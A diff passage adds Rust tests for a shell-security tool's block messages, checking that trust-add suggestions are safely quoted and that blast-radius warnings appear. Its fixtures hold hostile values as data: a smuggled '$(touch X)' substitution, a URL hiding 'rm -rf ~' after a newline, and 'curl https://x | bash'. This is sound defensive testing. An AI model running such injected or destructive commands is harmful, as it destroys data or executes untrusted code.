+        let line = out
+            .lines()
+            .find(|l| l.contains("tirith trust add"))
+            .unwrap_or_else(|| panic!("no To-allow line: {out}"));
+        assert!(
+            line.contains('\''),
+            "the domain target must be single-quoted: {line}"
+        );
+        // `$(touch X)` must not appear bare (outside the quoted token).
+        assert!(
+            !line.contains("add $(") && !line.contains("add evil.example/$("),
+            "the command substitution must be inside single quotes, not runnable: {line}"
+        );
+    }
+
+    #[test]
+    fn block_to_allow_url_with_newline_prints_safe_fallback_not_command() {
+        // F1 (HIGH): a target that cannot be safely single-quoted (it contains a
+        // newline) must NOT yield a runnable `tirith trust add` command line —
+        // instead a safe manual-trust note is printed.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                raw: "https://x/a\nrm -rf ~".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                !out.contains("tirith trust add 'https"),
+                "an unquotable (newline) target must not produce a runnable command (color={color}): {out}"
+            );
+            assert!(
+                out.contains("trust this target manually with `tirith trust add`"),
+                "an unquotable target must fall back to the safe manual note (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_to_allow_target_changed_by_scrub_prints_safe_fallback_not_command() {
+        // If terminal-control scrubbing CHANGES the target (here a zero-width
+        // space is stripped), a `trust add <scrubbed>` would trust a DIFFERENT
+        // target than the one blocked, so we must print the manual fallback rather
+        // than a misleading runnable command.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                // U+200B ZERO WIDTH SPACE inside the host: quotable, but scrubbed.
+                raw: "https://exa\u{200b}mple.com/x".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                !out.contains("tirith trust add 'https"),
+                "a scrub-altered target must not produce a runnable command (color={color}): {out}"
+            );
+            assert!(
+                out.contains("trust this target manually with `tirith trust add`"),
+                "a scrub-altered target must fall back to the safe manual note (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_with_destructive_finding_renders_blast_radius_header() {
+        // 14c: a Block containing a destructive Blast* finding renders the
+        // blast-radius header pointing at `tirith preview`.
+        let verdict = block_verdict_with_evidence(
+            RuleId::BlastDeletesOutsideRepo,
+            vec![Evidence::Text {
+                detail: "target '/home' is outside the repo".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                out.contains("blast radius:") && out.contains("tirith preview -- <cmd>"),
+                "destructive block must render the blast-radius header (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_with_fetch_pipe_finding_renders_blast_radius_header() {
+        // 14c: the fetch-pipe family (here CurlPipeShell) also trips the header.
+        let verdict = block_verdict_with_evidence(
+            RuleId::CurlPipeShell,
+            vec![Evidence::Text {
+                detail: "curl https://x | bash".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains("blast radius:"),
+            "curl-pipe-shell block must render the blast-radius header: {out}"
+        );
+    }
+
+    #[test]
+    fn block_without_url_or_destructive_renders_neither_advisory() {
+        // A non-URL, non-destructive block (e.g. a bidi-control terminal finding
+        // whose only evidence is a byte sequence) must emit NEITHER the To-allow
+        // line NOR the blast-radius header.
+        let verdict = block_verdict_with_evidence(
+            RuleId::BidiControls,
+            vec![Evidence::ByteSequence {
+                offset: 0,
+                hex: "e2 80 ae".to_string(),
+                description: "RIGHT-TO-LEFT OVERRIDE".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            !out.contains("To allow"),
+            "no URL/host → no To-allow line: {out}"
+        );
+        assert!(
+            !out.contains("blast radius:"),
+            "non-destructive → no blast-radius header: {out}"
+        );
+    }
+
+    #[test]
+    fn non_block_verdict_renders_no_block_advisories() {
+        // The advisories are gated on Action::Block; a Warn verdict (even with a
+        // URL) must not show them.
+        let mut verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                raw: "https://bit.ly/x".to_string(),
+            }],
+        );
+        verdict.action = Action::Warn;
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            !out.contains("To allow"),
+            "Warn must not show To-allow: {out}"
+        );
+        assert!(
+            !out.contains("blast radius:"),
+            "Warn must not show blast-radius: {out}"
+        );
     }
 
     #[test]
